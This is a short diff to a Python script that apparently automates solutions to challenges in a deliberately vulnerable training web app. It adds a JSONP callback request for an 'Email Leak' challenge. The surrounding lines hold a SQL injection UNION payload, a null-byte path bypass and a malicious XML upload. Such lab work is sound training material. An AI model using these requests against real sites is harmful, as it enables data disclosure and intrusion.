@@ -21,6 +21,8 @@ requests.get(url+'/rest/products/search',params={'q':'qwert\')) UNION SELECT sql
 requests.post(url+'/file-upload', files={'file':open('file-upload/Deprecated Interface.xml','rb')})
 # ---- Easter Egg (Find the hidden easter egg.)
 requests.get(url+'/ftp/eastere.gg%2500.md')
+# ---- Email Leak (Perform an unwanted information disclosure by accessing data cross-domain.)
+requests.get(url+'/rest/user/whoami', params={'callback':''})
 # ---- Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)
 requests.get(url+'/rest/qwertz')
 # ---- Forgotten Developer Backup (Access a developer's forgotten backup file.)
